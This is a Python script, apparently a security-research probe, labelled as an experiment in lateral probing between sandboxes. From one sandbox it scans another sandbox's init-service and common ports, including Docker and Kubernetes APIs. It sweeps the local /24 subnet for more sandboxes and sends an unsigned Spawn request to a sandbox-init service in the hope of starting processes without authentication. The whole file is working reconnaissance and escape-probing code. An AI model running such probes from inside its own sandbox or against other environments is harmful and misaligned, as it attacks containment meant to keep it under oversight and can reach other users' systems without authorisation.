# 实验I17: 沙箱间横向探测(双沙箱)
# 沙箱A 扫描/连接 沙箱B 的 IP 与 sandbox-init 服务端口
import socket, subprocess, json, os

def run(cmd, timeout=10):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

# 沙箱A(B 的 IP 通过环境变量传入)
target = os.environ.get("TARGET_IP", "")
print(f"== [0] 目标沙箱 IP: {target} ==", flush=True)

print("== [1] 本机(沙箱A)网络信息 ==", flush=True)
print(run("cat /proc/net/fib_trie 2>/dev/null | grep -B1 '32 host' | head -10; python3 -c \"import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(('8.8.8.8',80)); print('本机IP:', s.getsockname()[0])\" 2>&1"), flush=True)

print("== [2] 扫描 B 的 sandbox-init 端口 (23456/7531/7532) ==", flush=True)
for port in [23456, 7531, 7532]:
    for ip in [target, f"{target}"]:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((ip, port))
            print(f"  CONNECT {ip}:{port} OK!", flush=True)
            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
            try:
                d = s.recv(200)
                print(f"    响应: {d[:150]!r}", flush=True)
            except socket.timeout:
                print("    (无响应)", flush=True)
            s.close()
        except Exception as e:
            print(f"  CONNECT {ip}:{port} FAIL: {type(e).__name__} {e}", flush=True)

print("== [3] 探测 B 的常见服务端口 ==", flush=True)
for port in [22, 80, 443, 2375, 2376, 6443, 8080, 9000, 47076]:
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((target, port))
        print(f"  {target}:{port} OPEN", flush=True)
        s.close()
    except Exception:
        pass

print("== [4] 同网段 /24 快速扫描 (找到其他沙箱) ==", flush=True)
# 从本机 IP 推 /24
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
except Exception:
    local_ip = ""
print(f"  本机: {local_ip}", flush=True)
if local_ip:
    base = ".".join(local_ip.split(".")[:3])
    found = []
    for i in range(1, 255):
        ip = f"{base}.{i}"
        try:
            s = socket.socket()
            s.settimeout(0.4)
            s.connect((ip, 23456))
            print(f"  *** {ip}:23456 OPEN (sandbox-init!) ***", flush=True)
            found.append(ip)
            s.close()
        except Exception:
            pass
    print(f"  扫描完成, 发现 {len(found)} 个开放 23456 的主机: {found}", flush=True)

print("== [5] 尝试连接其他沙箱的 23456 并调用 SpawnService(无签名) ==", flush=True)
# 使用扫描发现的 IP(或 env TARGET)
for ip in [target]:
    try:
        s = socket.socket()
        s.settimeout(4)
        s.connect((ip, 23456))
        body = b"{}"
        req = (f"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/connect+json\r\nContent-Length: {len(body)}\r\n\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(4096)
                if not c: break
                data += c
        except socket.timeout:
            pass
        print(f"  {ip}:23456 Spawn 无签名: {data[:300]!r}", flush=True)
        s.close()
    except Exception as e:
        print(f"  {ip}:23456 Spawn: ERR {type(e).__name__} {e}", flush=True)

print("done", flush=True)
